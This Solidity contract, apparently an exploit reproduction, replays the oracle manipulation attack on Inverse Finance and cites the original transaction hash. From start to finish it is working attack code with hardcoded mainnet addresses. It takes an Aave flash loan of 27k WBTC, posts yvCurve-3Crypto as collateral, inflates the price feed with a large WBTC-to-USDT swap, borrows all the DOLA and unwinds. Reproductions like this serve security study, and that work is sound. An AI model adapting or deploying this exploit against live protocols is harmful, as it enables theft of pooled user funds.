// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import "./interfaces/InverseInterfaces.sol";

// Tx hash: 0x958236266991bc3fe3b77feaacea120f172c0708ad01c7a715b255f218f9313c
contract InverseExploiter {
    IERC20Like private constant WBTC = IERC20Like(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
    IUSDT private constant USDT = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20Like private constant DOLA = IERC20Like(0x865377367054516e17014CcdED1e7d814EDC9ce4);

    IAave private constant AAVE = IAave(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);

    ICurvePool private constant TRICRYPTO2 = ICurvePool(0xD51a44d3FaE010294C616388b506AcdA1bfAAE46);
    ICurvePool private constant _3POOL = ICurvePool(0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7);
    ICurvePool private constant DOLA_3POOL = ICurvePool(0xAA5A67c256e27A5d80712c51971408db3370927D);
    ICurveRouter private constant CURVE_ROUTER = ICurveRouter(0x8e764bE4288B842791989DB5b8ec067279829809);

    IERC20Like private constant CRV3CRYPTO = IERC20Like(0xc4AD29ba4B3c580e6D59105FFf484999997675Ff);
    IERC20Like private constant _3CRV = IERC20Like(0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490);

    IYVault private constant YVCRV_3CRYPTO = IYVault(0xE537B5cc158EB71037D4125BDD7538421981E6AA);

    IComptroller private constant COMPTROLLER = IComptroller(0x4dCf7407AE5C07f8681e1659f626E114A7667339); 
    ICErc20 private constant AN_YVCRV_3CRYPTO = ICErc20(0x1429a930ec3bcf5Aa32EF298ccc5aB09836EF587);
    ICErc20 private constant AN_DOLA = ICErc20(0x7Fcb7DAC61eE35b3D4a51117A7c58D53f0a8a670);

    IFeed private constant YVCRV_3CRYPTO_FEED = IFeed(0xE8b3bC58774857732C6C1147BFc9B9e5Fb6F427C);

    uint256 private constant INITIAL_WBTC_AMOUNT = 27_000e8; // 27k WBTC
    uint256 private constant INITIAL_DEPOSIT_AMOUNT = 225e8; // 225 WBTC

    constructor() {
        WBTC.approve(address(CURVE_ROUTER), type(uint256).max);
        USDT.approve(address(CURVE_ROUTER), type(uint256).max);
        DOLA.approve(address(CURVE_ROUTER), type(uint256).max);
    }

    function exploit() external {
        address receiverAddress = address(this);

        address[] memory assets = new address[](1);
        assets[0] = address(WBTC);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = INITIAL_WBTC_AMOUNT;

        uint256[] memory modes = new uint256[](1);

        address onBehalfOf = address(this);
        bytes memory params = "";
        uint16 referralCode = 0;

        // Flashloan 27k WBTC
        AAVE.flashLoan(
            receiverAddress,
            assets,
            amounts,
            modes,
            onBehalfOf,
            params,
            referralCode
        );
    }

    function executeOperation(
        address[] calldata,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address,
        bytes calldata
    )
        external
        returns (bool)
    {
        // Deposit 225 WBTC and mint crv3crypto
        WBTC.approve(address(TRICRYPTO2), INITIAL_DEPOSIT_AMOUNT);
        uint256[3] memory amount;
        amount[0] = 0;
        amount[1] = INITIAL_DEPOSIT_AMOUNT;
        amount[2] = 0;
        TRICRYPTO2.add_liquidity(amount, 0);

        // Deposit Curve LP tokens into yVault and mint yvCRV-3Crypto
        uint256 balance = CRV3CRYPTO.balanceOf(address(this));
        CRV3CRYPTO.approve(address(YVCRV_3CRYPTO), balance);
        YVCRV_3CRYPTO.deposit(balance, address(this));

        // Deposit yvCurve-3Crypto to mint anYvCrv3Crypto cTokens and use as collateral
        balance = YVCRV_3CRYPTO.balanceOf(address(this));
        YVCRV_3CRYPTO.approve(address(AN_YVCRV_3CRYPTO), balance);
        AN_YVCRV_3CRYPTO.mint(balance);
        address[] memory cTokens = new address[](1);
        cTokens[0] = address(AN_YVCRV_3CRYPTO);
        COMPTROLLER.enterMarkets(cTokens);

        // Manipulate Inverse's vulnerable oracle by swapping 26,775 WBTC for 75,403,376 USDT.
        // The price of yvCurve-3Crypto returned is inflated due to oracle's use of asset balances in tricrypto pool.
        balance = WBTC.balanceOf(address(this));
        uint256 oldAnswer = YVCRV_3CRYPTO_FEED.latestAnswer();
        CURVE_ROUTER.exchange(address(TRICRYPTO2), address(WBTC), address(USDT), balance, 0, address(this));
        assert(YVCRV_3CRYPTO_FEED.latestAnswer() > oldAnswer);

        // Borrow all 10.1M DOLA using inflated collateral value
        balance = DOLA.balanceOf(address(AN_DOLA));
        AN_DOLA.borrow(balance);

        // Swap back to WBTC
        balance = USDT.balanceOf(address(this));
        CURVE_ROUTER.exchange(address(TRICRYPTO2), address(USDT), address(WBTC), balance, 0, address(this));

        // Swap DOLA for 3CRV
        balance = DOLA.balanceOf(address(this));
        CURVE_ROUTER.exchange(address(DOLA_3POOL), address(DOLA), address(_3CRV), balance, 0, address(this));

        // Withdraw USDT from 3pool
        balance = _3CRV.balanceOf(address(this));
        _3POOL.remove_liquidity_one_coin(balance, 2, 0);

        // Swap 10M USDT for 451 WBTC
        balance = WBTC.balanceOf(address(this));
        CURVE_ROUTER.exchange(address(TRICRYPTO2), address(USDT), address(WBTC), 10_000_000e6, 0, address(this));

        // Repay flash loan
        WBTC.approve(address(AAVE), amounts[0] + premiums[0]);
        return true;
    }
}
